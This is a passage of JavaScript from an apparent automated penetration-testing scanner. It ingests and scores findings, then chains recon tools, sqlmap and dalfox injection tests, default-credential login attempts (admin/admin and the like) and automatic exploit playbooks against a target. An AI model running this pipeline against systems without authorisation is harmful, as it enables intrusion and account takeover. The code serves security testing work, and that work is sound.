      const capped = String(f.severity).toLowerCase()
      f.severity = 'medium'
      f.cvss = null
      f.cvssVector = null
      f.exploitPlaybooks = []
      f.evidence = {
        ...f.evidence,
        unverified: true,
        severityCappedFrom: capped,
        note: `Capped ${capped} → medium: reviewer flagged this needs-validation and no response artifact backs the claim.`,
      }
      this.log(scanId, 'info',
        `⚖️  "${f.title}" capped ${capped} → medium — no artifact backs the claim (unverified findings cannot outrank their evidence)`)
    }

    // Publish the capture verdict *before* scoring. `findCaptures` is the only
    // layer that can tell a real artifact from a title, and the semantic
    // classifier runs below; without this stamp a class gated on
    // `requiresConfirmed` (e.g. credentialed CORS) could never fire, because
    // `verifyStatus` is not attached until the report contract builds its view
    // objects — long after the score is already frozen into the finding row.
    f.captureConfirmed = capturedNow

    // CVSS v4.0 score is DERIVED from the vector, never accepted from upstream.
    // Trusting an inbound `f.cvss` let a tool's guess (10.0 on a log file) become
    // permanent, and `Math.max()` in the merge below then made it unremovable —
    // that is exactly how the report ended up ranking CRITICAL 9.3 below HIGH 10.0.
    //
    // The declared severity is a FLOOR, never a ceiling to be quietly raised.
    // `classifyFinding` `info`s findings up to 6.3 as soon as the title matches a
    // semantic class (an "exposed admin directory" scores admin_surface/medium),
    // so a deliberate downgrade to info was silently undone here — the mechanism
    // that let rejected findings stay Critical in the report.
    {
      const declaredSeverity = f.severity ? String(f.severity).toLowerCase() : null
      const declaredRank = SEVERITY_RANK[declaredSeverity]
      const evaluated = evaluateFindingCvss(f)
      const evaluatedRank = SEVERITY_RANK[evaluated.severity]
      if (declaredRank != null && evaluatedRank != null && evaluatedRank > declaredRank) {
        f.cvssVector = CVSS4_TEMPLATES.recon_info
        f.cvss = 0
        f.severity = declaredSeverity
        this.log(scanId, 'info',
          `🎯 CVSS held at ${declaredSeverity}: class template would have promoted it to ${evaluated.score}/${evaluated.severity} (declared severity is a floor)`)
      } else {
        f.cvssVector = evaluated.vector
        f.cvss = evaluated.score
        f.severity = evaluated.severity
      }
      if (evaluated.reconciled && f.severity === evaluated.severity) {
        this.log(scanId, 'info',
          `🎯 CVSS reconciled "${f.title}": declared ${evaluated.declaredScore ?? '—'}/${evaluated.declaredSeverity ?? '—'} → ${evaluated.score}/${evaluated.severity} (${evaluated.vector})`)
      }
    }

    // Merge repeated detections from pattern scanning and AI audit passes.
    const fingerprint = findingFingerprint(f)
    const existing = db.get(`SELECT * FROM findings WHERE scan_id = ? AND fingerprint = ?`, scanId, fingerprint)
    if (existing) {
      const evidence = JSON.parse(existing.evidence || '{}')
      const sources = new Set([...(evidence.sources || [existing.module]), f.module || 'unknown'])
      const severity = SEVERITY_RANK[f.severity] > SEVERITY_RANK[existing.severity] ? f.severity : existing.severity      // Recomputed, never merged upward. The previous `Math.max(existing, new)`
      // made any inflated score permanent for the lifetime of the DB row.
      const merged = evaluateFindingCvss({
        ...f,
        severity,
        cvssVector: SEVERITY_RANK[f.severity] >= SEVERITY_RANK[existing.severity]
          ? (f.cvssVector || existing.cvss_vector)
          : (existing.cvss_vector || f.cvssVector),
      })

      // When merging, prefer AI-generated descriptions over pattern-scan boilerplate.
      // AI findings carry richer attack-path analysis, remediation with code examples,
      // and layman impact — the pattern-scan templates are generic by comparison.
      const isExistingPattern = existing.module === 'pattern-scan'
      const isNewAi = (f.module || '').startsWith('code-audit') || (f.module || '') === 'ai-audit'
      // Evidence is unioned, never replaced — see mergeFindingEvidence().
      const mergedEvidence = mergeFindingEvidence(evidence, f.evidence)
      mergedEvidence.sources = [...sources]
      if (VERSION_FINDING_MODULES.has(f.module) || VERSION_FINDING_MODULES.has(existing.module)) {
        // Keep both halves of the version record: the EOL verdict and the CVE list.
        mergedEvidence.mergedStages = [...new Set([
          ...(Array.isArray(evidence.mergedStages) ? evidence.mergedStages : []),
          existing.module, f.module,
        ].filter(Boolean))]
      }
      if (isExistingPattern && isNewAi) {
        db.run(`UPDATE findings SET severity = ?, cvss = ?, cvss_vector = ?, description = ?, layman_impact = ?, remediation = ?, evidence = ? WHERE id = ?`,
          merged.severity,
          merged.score,
          merged.vector,
          f.description || existing.description,
          f.laymanImpact || existing.layman_impact,
          f.remediation || existing.remediation,
          JSON.stringify({ ...mergedEvidence, aiPreferred: true }),
          existing.id)
        this.log(scanId, 'info', `↪ Merged: AI description replaced pattern-scan boilerplate for: ${f.title}`)
      } else {
        db.run(`UPDATE findings SET severity = ?, cvss = ?, cvss_vector = ?, evidence = ? WHERE id = ?`,
          merged.severity, merged.score, merged.vector,
          JSON.stringify(mergedEvidence), existing.id)
        this.log(scanId, 'info', `↪ Deduplicated finding: ${f.title}`)
      }
      return db.get(`SELECT * FROM findings WHERE id = ?`, existing.id)
    }
    f.evidence = { ...f.evidence, fingerprint, sources: [f.module || 'unknown'] }

    function beautifyFindingTitle(raw) {
      if (!raw) return 'Untitled Finding'
      let t = String(raw).trim()
      if (/uncommon header\(s\)\s*['"]([^'"]+)['"]/i.test(t)) {
        const m = t.match(/uncommon header\(s\)\s*['"]([^'"]+)['"]/i)
        return `Uncommon Header Detected: '${m[1]}'`
      }
      if (/alt-svc header was found.*advertising HTTP\/3/i.test(t)) {
        return 'HTTP/3 Advertised via Alt-Svc Header'
      }
      if (/anti-clickjacking X-Frame-Options/i.test(t)) {
        return 'Missing Anti-Clickjacking Header (X-Frame-Options)'
      }
      if (/X-Content-Type-Options header is not set/i.test(t)) {
        return 'Missing MIME Sniffing Protection (X-Content-Type-Options)'
      }
      if (/Strict-Transport-Security/i.test(t) && /missing|not set|not present/i.test(t)) {
        return 'Missing Strict-Transport-Security (HSTS) Header'
      }
      if (/Content-Security-Policy/i.test(t) && /missing|not set|not present/i.test(t)) {
        return 'Missing Content-Security-Policy (CSP) Header'
      }
      if (/HTML forms discovered\s*—\s*(\d+)\s*injection surfaces?/i.test(t)) {
        const m = t.match(/HTML forms discovered\s*—\s*(\d+)\s*injection surfaces?/i)
        const count = m ? m[1] : '1'
        return `HTML Form Discovered (${count} Injection Surface${count === '1' ? '' : 's'})`
      }
      t = t.replace(/^(?:nikto|nuclei|nmap|httpx|katana|dalfox|ffuf|subfinder|sqlmap|wpscan|arjun|native:[\w-]+|custom:[\w-]+)\s*:\s*/i, '')
      t = t.replace(/^\[(?:\d+|[+*✓x!~]|info|low|medium|high|critical)\]\s*/gi, '')
      t = t.replace(/^\/?[:\-]\s*/, '')
      t = t.replace(/^\[(?:\d+|[+*✓x!~])\]\s*/gi, '')
      t = t.replace(/^\/?[:\-]\s*/, '')
      t = t.replace(/[\.\s]+$/, '').replace(/\s{2,}/g, ' ').trim()
      if (t.length > 0) t = t.charAt(0).toUpperCase() + t.slice(1)
      return t || 'Untitled Finding'
    }

    f.title = beautifyFindingTitle(f.title)
    const id = `fnd_${randomUUID()}`
    const now = new Date().toISOString()
    try {
      db.run(
        `INSERT INTO findings (id, scan_id, title, severity, cvss, cvss_vector, cwe_id, cve_id, owasp_category, description, layman_impact, remediation, module, status, evidence, poc, agent_verdict, fingerprint, target, created_at)
         VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
        id, scanId, f.title || 'Untitled finding', f.severity || 'info',
        f.cvss ?? 0, f.cvssVector || null, f.cweId || f.cwe || null, f.cveId || null,
        f.owaspCategory || null, f.description || '', f.laymanImpact || null, f.remediation || '',
        f.module || 'unknown', 'open',
        JSON.stringify(f.evidence || {}), JSON.stringify(f.poc || {}),
        // Persist the FULL verdict. Storing only {agent, confidence, reasoning}
        // made a null/unverified result render identically to a confirmed one,
        // and threw away the evidence tier the operator needs to judge it.
        verdict ? JSON.stringify({
          agent: verdict.agent,
          confidence: verdict.confidence,
          reasoning: verdict.verdict,
          is_true_positive: verdict.isTruePositive,
          evidence_tier: verdict.evidenceTier || null,
        }) : null,
        fingerprint,
        f.target || null,
        now
      )
      const stored = db.get(`SELECT * FROM findings WHERE id = ?`, id)
      this.emit(scanId, 'scan:finding', { scanId, finding: stored })
      // Verbose: log every finding with severity, title, and module for live monitoring
      this.log(scanId, 'info', `📌 [${stored.severity}] ${stored.title} (${stored.module || 'unknown'})`)

      // ── AUTO-EXPLOIT: exploitation IS the verification step ──
      //
      // The previous guard required `verdict.isTruePositive && confidence >= 70`
      // before launching a campaign. That is a circular dependency: a finding is
      // only *promoted* to confirmed BY the artifact that a campaign produces, and
      // a campaign only launched once the finding was already confirmed. The net
      // effect was that the 126 registry playbooks essentially never ran — the
      // database shows 12 successful steps across all of recorded history — and
      // every report degenerated into recon plus head-based heuristics.
      //
      // Correct model: a finding that is *claimed* (severity-bearing, not already
      // contradicted by evidence) is a candidate for active confirmation. The
      // campaign captures the artifact, and the artifact is what promotes the
      // finding. Non-destructive techniques run automatically; anything
      // destructive or requiring approval is queued by the orchestrator itself,
      // so widening this trigger does not widen blast radius.
      const alreadyContradicted = f.aiVerification === false || f.evidence?.aiVerification === false
      const actionableSeverity = ['critical', 'high', 'medium'].includes(String(stored.severity || '').toLowerCase())
      const storedEvidence = (() => {
        try { return typeof stored.evidence === 'string' ? JSON.parse(stored.evidence) : (stored.evidence || {}) } catch { return {} }
      })()
      const hasTargetEvidence = findCaptures({ ...stored, evidence: storedEvidence }).length > 0
      const hasRunnablePlaybook = Array.isArray(storedEvidence.exploitPlaybooks) && storedEvidence.exploitPlaybooks.length > 0
      if (actionableSeverity && !alreadyContradicted && hasTargetEvidence && hasRunnablePlaybook) {
        this._autoExploit(scanId, stored)
      } else if (actionableSeverity && !alreadyContradicted && !hasTargetEvidence) {
        this.log(scanId, 'info', `⏭ Auto-exploit not launched for "${stored.title}": no target response artifact was captured`)
      }

      return stored
    } catch (e) {
      console.error(`[ingestFinding] INSERT failed for "${f.title}":`, e.message)
      return null
    }
  }

  // ── BLACKBOX ───────────────────────────────────────────────────────────────
  /**
   * Merge a coverage descriptor into the scan row's `blackbox_meta` blob.
   *
   * Merge-only: `retryFailedBlackbox` also reads and rewrites this column, so a
   * blind write here would drop whatever it had already recorded. Read-back and
   * Object.assign keeps both writers additive. Non-fatal by design — a scan must
   * not fail because it could not record its own scope.
   */
  _persistCoverage(scanId, coverage) {
    if (!coverage) return
    try {
      const row = db.get('SELECT blackbox_meta FROM scans WHERE id = ?', scanId)
      let meta = { tools: [], subdomains: [], urls: [], totalUrls: 0 }
      if (row?.blackbox_meta) {
        try { meta = Object.assign(meta, JSON.parse(row.blackbox_meta)) } catch { /* corrupt blob — rebuild */ }
      }
      meta.coverage = coverage
      db.run(`UPDATE scans SET blackbox_meta = ? WHERE id = ?`, JSON.stringify(meta), scanId)
    } catch (e) {
      this.log(scanId, 'warn', `Coverage descriptor not persisted: ${e.message}`)
    }
  }

  async runBlackbox(scan, { modules = [], objective = 'comprehensive', maxTools = 6, verify = true, depth = 'standard', owaspCategories = [] } = {}) {
    const scanId = scan.id
    const target = scan.target
    this._beginScan(scanId)
    // Remember the requested depth for later stages. runBlackbox is entered
    // once, but custom scripts run after finish() has already reset this.depth,
    // so the caller's value has to survive in a per-scan slot.
    if (!(this._scanDepth instanceof Map)) this._scanDepth = new Map()
    this._scanDepth.set(scanId, depth)
    await this.detectCatchAllBaseline(scanId, target)
    aiEngine.llm.resetUsageTotals()
    const catLabel = owaspCategories.length ? ` [OWASP: ${owaspCategories.join(',')}]` : ''
    this.log(scanId, 'info', `▶ Blackbox scan started on ${target} (depth=offensive — all probes active)${catLabel}`)
    this.progress(scanId, 2)

    // Store OWASP categories for reference in findings display
    if (owaspCategories.length) {
      try { db.run(`UPDATE scans SET owasp_categories = ? WHERE id = ?`, JSON.stringify(owaspCategories), scanId) } catch { /* non-critical */ }
    }

    const engine = await nativeToolsStatus()
    const available = Object.values(engine).filter(Boolean).length
    this.log(scanId, 'info', `⚡ Native Scanner Engine — ${available}/${Object.keys(engine).length} tools available on this host`)

    // A scan can only find what its toolchain can reach. Record which
    // vulnerability classes are unreachable on this host so the report can
    // state its own scope instead of printing a confident posture over an
    // untested surface. Persisted on the scan row via `_persistBlackboxMeta`.
    this._coverage.set(scanId, buildCoverage(engine, { modules }))
    const cov = this._coverage.get(scanId)
    if (cov.degraded) {
      for (const cls of cov.untestedClasses.filter(c => c.critical)) {
        this.log(scanId, 'warn', `⚠ Coverage gap — ${cls.label} will NOT be tested: ${cls.missingTools.join('/')} unavailable on this host`)
      }
      this.log(scanId, 'warn', `⚠ This scan is INCOMPLETE: ${cov.criticalGaps.length} critical class(es) cannot be exercised. The final report will be marked as such.`)
    } else if (cov.gaps.length) {
      this.log(scanId, 'info', `ℹ Reduced coverage — ${cov.gaps.length} non-critical class(es) unavailable: ${cov.gaps.join(', ')}`)
    }
    this._persistCoverage(scanId, cov)

    // Always audit HTTP security headers + sensitive paths first (fast, high-signal).
    await this.auditHttpBaseline(scanId, scan.target, { verify, targetType: scan.target_type })
    this.progress(scanId, 8)

    // Skip wpscan if the target is not WordPress (saves ~2 min + avoids Ruby errors).
    if (modules.includes('wpscan')) {
      const isWp = await this._isWordPress(scan.target)
      if (!isWp) {
        modules = modules.filter(m => m !== 'wpscan')
        this.log(scanId, 'info', '⏭ Skipping wpscan — target is not WordPress')
      }
    }

    // ── SUBDOMAIN + API/SWAGGER DISCOVERY ──
    // When the target is a bare host/domain (not a full URL path), enumerate
    // subdomains passively + actively, then probe each for Swagger/OpenAPI docs.
    if (/^https?:\/\//i.test(target) || !/\//.test(target)) {
      await this._runSubdomainDiscovery(scanId, target, { verify })
    }
    this.progress(scanId, 12)

    // If no explicit modules → run the full default toolchain natively
    if (!modules.length) {
      this.log(scanId, 'info', `No modules selected — running full default toolchain (objective=${objective})`)
      modules = ['nmap', 'whatweb', 'nikto', 'ffuf', 'katana', 'nuclei', 'arjun', 'dalfox',
        'feroxbuster', 'gau', 'sslscan']
    }

    // Run chosen tools in parallel batches (grouped so concurrent tools don't
    // saturate the network/CPU against the same target)
    {
      const reconBatch = modules.filter(m => ['nmap', 'whatweb', 'wafw00f', 'sslscan', 'masscan'].includes(m))
      const crawlBatch = modules.filter(m => ['katana', 'ffuf', 'gobuster', 'nuclei', 'feroxbuster', 'dirsearch', 'gau'].includes(m))
      const vulnBatch = modules.filter(m => ['nikto', 'arjun', 'dalfox', 'sqlmap', 'wpscan'].includes(m))
      const otherBatch = modules.filter(m => !['nmap', 'whatweb', 'wafw00f', 'sslscan', 'masscan', 'katana', 'ffuf', 'gobuster', 'nuclei', 'feroxbuster', 'dirsearch', 'gau', 'nikto', 'arjun', 'dalfox', 'sqlmap', 'wpscan'].includes(m))
      // Names travel with their batch: filtering one array independently of the
      // other mislabelled every subsequent batch in the log (crawl reported as recon).
      const batchSpecs = [
        ['recon', reconBatch],
        ['crawl', crawlBatch],
        ['vuln', vulnBatch],
        ['other', otherBatch],
      ].filter(([, b]) => b.length)
      const batches = batchSpecs.map(([, b]) => b)
      const batchNames = batchSpecs.map(([n]) => n)
      let done = 0
      for (let bi = 0; bi < batches.length; bi++) {
        const batch = batches[bi]
        await this.waitIfPaused(scanId)
        this.log(scanId, 'info', `▶ Starting ${batchNames[bi]} batch (${batch.length} tools: ${batch.join(', ')})`)
        const results = await Promise.allSettled(
          batch.map(async (mod) => {
            if (!NATIVE_TOOLS[mod]) { this.log(scanId, 'warn', `Unknown module: ${mod}`); return }
            this.log(scanId, 'info', `▶ Running tool: ${mod} [native]\n$ ${previewNativeCommand(mod, target)}`)
            const res = await runNativeTool(mod, target, { owner: scanId })
            await this.processToolOutput(scanId, mod, res, { verify, targetType: scan.target_type, target })
          })
        )
        for (let i = 0; i < results.length; i++) {
          if (results[i].status === 'rejected') {
            this.log(scanId, 'warn', `Tool ${batch[i]} error: ${results[i].reason?.message || results[i].reason}`)
          }
        }
        done += batch.length
        this.progress(scanId, 12 + (done / modules.length) * 58)
      }
    }

    // ── COOKIE + CORS + HTML FORM & API HARVESTING ──
    // Runs BEFORE injection chaining: harvests forms and client-side JavaScript APIs
    // across crawled subpages so dalfox + sqlmap actually have discovered endpoints to test.
    this.log(scanId, 'info', '▶ Starting cookie/CORS, form & script API harvesting')
    await this._auditCookiesCors(scanId, target, { verify })

    // ── INJECTION CHAINING STAGE ──
    // Feed parameterized URLs discovered by katana/ffuf/arjun into dalfox (XSS)
    // and sqlmap (SQLi). This is where most SEVERE vulns are actually found.
        this.log(scanId, 'info', '▶ Starting injection chaining stage (dalfox + sqlmap on discovered URLs)')
        await this.chainInjectionTests(scanId, { verify, targetType: scan.target_type, offensive: true, target })
        this.progress(scanId, 70)

        // ── OFFENSIVE STAGES (always active) ──
        this.log(scanId, 'info', '▶ Starting service vulnerability probing (nmap NSE scripts)')
        await this._probeServiceVulns(scanId, target, { verify })
        this.progress(scanId, 78)
        // ── VERSION LIFECYCLE (EOL) ANALYSIS ──
        // Cross-references whatweb/nmap/header versions against EOL dates.
        // Must run AFTER tool batches so findings carry version strings.
        this.log(scanId, 'info', '▶ Starting version lifecycle (EOL) analysis')
        try {
          await this._analyzeVersionLifecycle(scanId, { verify })
        } catch (err) {
          this.log(scanId, 'warn', `EOL analysis warning: ${err.message}`)
        }
        // ── VERSION AUDIT (architecture fingerprint → CVE/CWE correlation) ──
        // Detects every software version visible on the target (web server,
        // language runtime, framework, CMS, JS library, database hints) and
        // correlates each against NIST NVD, mapping results to OWASP Top 10.
        this.log(scanId, 'info', '▶ Starting version audit (architecture fingerprint → CVE correlation)')
        try {
          await this._auditVersions(scanId, target, { verify })
        } catch (err) {
          this.log(scanId, 'warn', `Version audit warning: ${err.message}`)
        }
        this.log(scanId, 'info', '▶ Starting login surface discovery')
        await this._discoverLoginSurfaces(scanId, target, { verify })
        this.log(scanId, 'info', '▶ Starting offensive payload matching')
        await this._matchOffsecPayloads(scanId)
        this.progress(scanId, 85)

        // ── RESPONSE BODY SCANNING ──
        this.log(scanId, 'info', '▶ Starting response body scanning')
        await this._scanResponseBodies(scanId, target, { verify })
        this.progress(scanId, 90)

        this.progress(scanId, 95)

        // ── DEFAULT-CREDENTIAL BRUTE-FORCE STAGE ──
        // Actually interact with discovered login forms: try common default
        // credential pairs (admin/admin, admin/password, ...) via HTTP POST.
        // Must run AFTER _auditCookiesCors so harvested login forms are available.
        this.log(scanId, 'info', '▶ Starting default-credential testing on login forms')
        await this._tryDefaultCreds(scanId, target, { verify })
        // ── LOGIN RATE-LIMIT TEST ──
        // Burst of failed logins → checks for 429/CAPTCHA/lockout/slowdown.
        this.log(scanId, 'info', '▶ Starting login rate-limit testing')
        try {
          await this._testLoginRateLimit(scanId, target, { verify })
        } catch (err) {
          this.log(scanId, 'warn', `Rate-limit test warning: ${err.message}`)
        }

        // ── CUSTOM SCRIPTS STAGE ──
        // Admin-defined scripts (bash/python/node) that emit JSONL findings.
        // Runs last so scripts can leverage any state gathered earlier.
        this.log(scanId, 'info', '▶ Starting custom scripts stage')
        try {
          await this._runCustomScripts(scanId, target, { verify, depth })
        } catch (err) {
      this.log(scanId, 'warn', `Custom scripts stage warning: ${err.message}`)
    }

    this.finish(scanId, 'completed')
  }

  /**
   * CUSTOM SCRIPTS STAGE
   * Runs every enabled custom script whose trigger_point is 'post-scan'
   * (or 'post-recon' — both run here, at the end of the pipeline, when the
   * most context is available). Scripts emit JSONL findings on stdout.
   */
  async _runCustomScripts(scanId, target, { verify, depth } = {}) {
    let scripts
    try {
      scripts = getScriptsForTrigger('post-scan').concat(getScriptsForTrigger('post-recon'))
    } catch { return } // table not migrated yet — skip silently
    if (!scripts.length) return

    this.log(scanId, 'info', `Custom scripts: running ${scripts.length} script(s)`)
    for (const script of scripts) {
      try {
        if (this._shouldSkipCustomScript(scanId, script)) {
          this.log(scanId, 'info', `⏭ Skipping custom script "${script.name}" — target technology context is not applicable`)
          continue
        }
        this.log(scanId, 'info', `Custom script "${script.name}" starting`)
        const baseline = this._catchAllBaselines.get(scanId) || null
        const { result, findings } = await runCustomScript(script, { target, scanId, depth: depth || this._scanDepth?.get(scanId) || this.depth || 'standard', baseline })
        if (!result.success) {
          this.log(scanId, 'warn', `Custom script "${script.name}" exited ${result.code}: ${String(result.stderr || '').slice(0, 200)}`)
        }
        let ingested = 0
        for (const f of findings) {
          // ── CATCH-ALL EVIDENCE ENRICHMENT ──
          // Custom scripts typically only emit {title, severity, ...} without
          // response metadata (status, contentLength, bodyHash).  Without those
          // fields, _isSoft404Finding() cannot compare the finding against the
          // catch-all baseline and every 200 catch-all landing page sails through.
          //
          // Fix: when a catch-all baseline exists and the finding lacks response
          // metadata, re-fetch the claimed URL and attach the response fingerprint
          // so _isSoft404Finding() can correctly suppress catch-all matches.
          // Only probe URLs for path-based findings. Non-path findings (DNS, ports, SSL, redirects)
          // must never fall back to fetching the root target HTML and getting stamped with the SPA baseline hash.
          const isNonPathFinding = /\b(?:dns|spf|dmarc|dkim|caa|zone transfer|wildcard dns|open port|non-standard port|tls|ssl|cipher|certificate|redirect|rate limit(?:ing)?|cookie|security header|alt-svc)\b/i.test(`${f.title || ''} ${f.description || ''}`)
          const probeUrl = !isNonPathFinding ? this._extractProbeUrl(f, target) : null
          if (probeUrl && (!f.evidence || f.evidence.status == null || f.evidence.status === 200)) {
            try {
              const res = await fetch(probeUrl, { method: 'GET', redirect: 'manual', signal: AbortSignal.timeout(8000) })
              const body = await res.text()
              f.evidence = f.evidence || {}
              f.evidence.url = f.evidence.url || probeUrl
              f.evidence.status = res.status
              f.evidence.contentLength = body.length
              f.evidence.bodyHash = crypto.createHash('sha256').update(body.slice(0, 4096)).digest('hex')
              f.evidence.isHtml = /<(!doctype|html|head|body)/i.test(body)
              f.evidence.contentType = res.headers.get('content-type') || ''

              if (res.status === 404 || res.status === 410) {
                // The live endpoint does not exist. Discard immediately.
                continue
              }
            } catch { /* non-fatal — finding proceeds without enrichment */ }
          }
          f.evidence = f.evidence || {}
          if (!f.evidence.url) f.evidence.url = probeUrl || target
          if (!f.evidence.output && result.stdout) {
            f.evidence.output = String(result.stdout).slice(0, 1000)
          }
          const stored = await this.ingestFinding(scanId, {
            ...f,
            module: `custom-script:${script.name}`,
            target,
            poc: result.success ? `Script: ${script.name} (${script.language})` : undefined,
          }, { verify, targetType: 'url' })
          if (stored) ingested++
        }
        const suppressed = findings.length - ingested
        this.log(scanId, 'info', `Custom script "${script.name}" → ${findings.length} finding(s)${suppressed ? ` (${suppressed} suppressed as catch-all)` : ''}`)
      } catch (err) {
        this.log(scanId, 'warn', `Custom script "${script.name}" failed: ${err.message}`)
      }
    }
  }

  /**
   * VERSION LIFECYCLE (EOL) ANALYSIS — cross-references detected software
   * versions against known end-of-life dates. An EOL platform receives NO
   * security patches — this is often the single biggest real risk on a
   * target (e.g. Moodle 4.1 went EOL Dec 2025 but still powers live sites).
   */
  async _analyzeVersionLifecycle(scanId, { verify } = {}) {
    // EOL registry: [product, versionRegex, eolDate, successor]
    const EOL_REGISTRY = [
      { product: 'Moodle', re: /\bmoodle[^\d]{0,20}(\d+)\.(\d+)/i, eol: { '4.5': '2027-06', '4.4': '2026-12', '4.3': '2025-12', '4.1': '2025-12', '4.0': '2024-12', '3.9': '2023-12', '3.8': '2022-11', '3.7': '2021-11' }, note: 'Moodle LTS releases get 3 years of support; non-LTS only 18 months.' },
      { product: 'WordPress', re: /\bwordpress[^\d]{0,20}(\d+)\.(\d+)/i, eol: { '6.0': '2024-04', '5.9': '2023-12', '5.8': '2022-12', '5.7': '2022-03', '5.6': '2021-12' }, note: 'WordPress core versions stop receiving security updates once superseded.' },
      { product: 'Apache HTTP Server', re: /\bapache(?:\/|\s)?(\d+)\.(\d+)/i, eol: { '2.4': null, '2.2': '2017-07', '2.0': '2013-07' }, note: 'Apache 2.2 and earlier are EOL — no security patches since 2017.' },
      { product: 'nginx', re: /\bnginx(?:\/|\s)?(\d+)\.(\d+)/i, eol: { '1.29': '2026-05', '1.28': '2026-04', '1.27': '2025-05', '1.26': '2025-04', '1.25': '2024-05', '1.24': '2024-04', '1.23': '2023-05', '1.22': '2023-04', '1.21': '2022-05', '1.20': '2022-04', '1.19': '2021-05', '1.18': '2021-04', '1.17': '2020-05', '1.16': '2020-04', '1.15': '2019-05', '1.14': '2019-04' }, note: 'nginx supports a branch until the next stable release ships, so 1.18 (Apr 2020) went unpatched when 1.20 landed in Apr 2021.' },
      { product: 'PHP', re: /\bphp[^\d]{0,10}(\d+)\.(\d+)/i, eol: { '8.3': '2027-12', '8.2': '2026-12', '8.1': '2025-12', '8.0': '2023-11', '7.4': '2022-11', '7.3': '2021-12', '7.2': '2020-11', '7.1': '2019-12', '7.0': '2019-01', '5.6': '2018-12' }, note: 'PHP branches get 2 years active + 2 years security support.' },
      { product: 'OpenSSH', re: /\bopenssh[^\d]{0,10}(\d+)\.(\d+)/i, eol: { '8.9': '2024-07', '8.8': '2023-09', '8.7': '2023-04', '8.6': '2022-07', '8.4': '2021-09', '8.2': '2021-03', '7.9': '2020-09' }, note: 'OpenSSH releases get ~2 years of security support.' },
      { product: 'jQuery', re: /\bjquery[^\d]{0,10}(\d+)\.(\d+)/i, eol: { '3.6': null, '3.5': '2021-11', '3.4': '2020-06', '3.3': '2019-08', '2.2': '2017-03', '1.12': '2017-03' }, note: 'jQuery 3.6+ is maintained; older branches have known XSS (CVE-2020-11022/11023).' },
      { product: 'Drupal', re: /\bdrupal[^\d]{0,20}(\d+)\.(\d+)/i, eol: { '10.0': '2023-12', '9.0': '2021-06', '9.1': '2021-12', '9.2': '2022-06', '9.3': '2022-12', '9.4': '2023-06', '9.5': '2023-11', '8.0': '2021-06', '7.0': '2022-01' }, note: 'Drupal 7 EOL was extended to Jan 2025; Drupal 8 EOL Nov 2021.' },
      { product: 'Tomcat', re: /\btomcat[^\d]{0,20}(\d+)\.(\d+)/i, eol: { '10.0': '2024-10', '9.0': null, '8.5': '2024-03', '7.0': '2021-03' }, note: 'Tomcat 7 and 8.5 are EOL — no security patches.' },
      { product: 'Exim', re: /\bexim[^\d]{0,10}(\d+)\.(\d+)/i, eol: { '4.95': '2023-06', '4.94': '2022-06', '4.92': '2021-06' }, note: 'Exim has had multiple critical RCEs (CVE-2019-10149, CVE-2023-42115).' },
    ]
    // Gather version strings from stored findings (whatweb/nmap/server headers)
    const rows = db.all(`SELECT title, description, evidence FROM findings WHERE scan_id = ?`, scanId)
    const versionText = rows.map(r => `${r.title} ${r.description}`).join(' ').slice(0, 100000)
    const now = new Date()
    const seen = new Set()
    for (const entry of EOL_REGISTRY) {
      const m = versionText.match(entry.re)
      if (!m) continue
      const majorMinor = `${m[1]}.${m[2]}`
      if (seen.has(entry.product)) continue
      seen.add(entry.product)
      const eolLookup = resolveEolDate(entry.eol, majorMinor)
      if (eolLookup.status === 'supported') continue // actively supported branch
      if (eolLookup.status === 'unknown') {
        // Never invent an EOL date. A missing registry entry used to fall
        // through to `new Date('undefined-01')`, which JS silently parses as
        // 2001-01-01T00:00:00Z — producing "EOL (undefined) ... 314 months"
        // in a live report while every downstream check said the date was valid.
        this.log(scanId, 'warn',
          `📅 EOL registry has no branch for ${entry.product} ${majorMinor} — EOL status not asserted (add the branch to EOL_REGISTRY)`)
        continue
      }
      const { eolDate, derived, oldestBranch } = eolLookup
      // A falsy/blank date is not a date. Guarding only `Number.isNaN` let the
      // string "undefined-01" through (validated by a looser formatter elsewhere)
      // and the finding shipped as "END-OF-LIFE (undefined) — no security
      // patches for 314 months", i.e. `new Date('undefined-01')` silently
      // becoming 2001-01-01. Refuse to assert an EOL claim we cannot date.
      if (!eolDate || typeof eolDate !== 'string' || !/^\d{4}-\d{2}$/.test(eolDate)) {
        this.log(scanId, 'warn',
          `📅 EOL date for ${entry.product} ${majorMinor} resolved to "${eolDate}" — not a YYYY-MM value, so no EOL claim is made`)
        continue
      }
      const eol = new Date(`${eolDate}-01T00:00:00Z`)
      if (Number.isNaN(eol.getTime())) {
        this.log(scanId, 'warn', `📅 EOL date "${eolDate}" for ${entry.product} ${majorMinor} is not a valid date — skipping`)
        continue
      }
      const provenance = derived
        ? ` Ops note: branch ${majorMinor} is older than the oldest branch tracked (${oldestBranch}); the date shown is that branch's EOL, so this build has been unpatched for AT LEAST this long.`
        : ''
      if (eol < now) {
        const monthsPast = Math.floor((now - eol) / (1000 * 60 * 60 * 24 * 30.44))

        await this.ingestFinding(scanId, {
          title: `${entry.product} ${majorMinor} is END-OF-LIFE (${eolDate}) — no security patches for ${monthsPast} months`,
          severity: monthsPast > 24 ? 'high' : 'medium',
          cweId: 'CWE-1104',
          owaspCategory: 'A03:2025-Software Supply Chain Failures',
          description: `${entry.product} ${majorMinor} was detected on the target and reached end-of-life on ${eolDate} — ${monthsPast} months ago. ${entry.note} EOL software receives NO security patches: every vulnerability disclosed since ${eolDate} remains unpatched and publicly exploitable. This is frequently the single highest-impact risk on a target, even when no specific CVE is matched.${provenance}`,
          remediation: `Upgrade ${entry.product} from ${majorMinor} to the latest supported release. If immediate upgrade is impossible, isolate the service (WAF rules, network segmentation) and schedule the upgrade as a priority.`,
          module: 'version-lifecycle',
          evidence: {
            product: entry.product,
            version: majorMinor,
            eolDate,
            eolDateDerived: derived,
            eolDerivedFromBranch: derived ? oldestBranch : null,
            monthsPast,
            detectedFrom: m[0],
            // CVE correlation is owned by the version audit stage, which runs
            // immediately after this one and merges into this record (see
            // VERSION_FINDING_MODULES). Reporting `totalCves: 0` here would
            // assert a negative that nobody actually verified.
            cveLookupOwner: 'version-audit',
            knownCves: [],
            totalCves: null,
          },
        }, { verify })
        this.log(scanId, 'info', `📅 EOL: ${entry.product} ${majorMinor} (EOL ${eolDate}${derived ? `, inferred from branch ${oldestBranch}` : ''}, ${monthsPast} months past)`)
      } else {
        const monthsLeft = Math.ceil((eol - now) / (1000 * 60 * 60 * 24 * 30))
        if (monthsLeft <= 6) {
          await this.ingestFinding(scanId, {
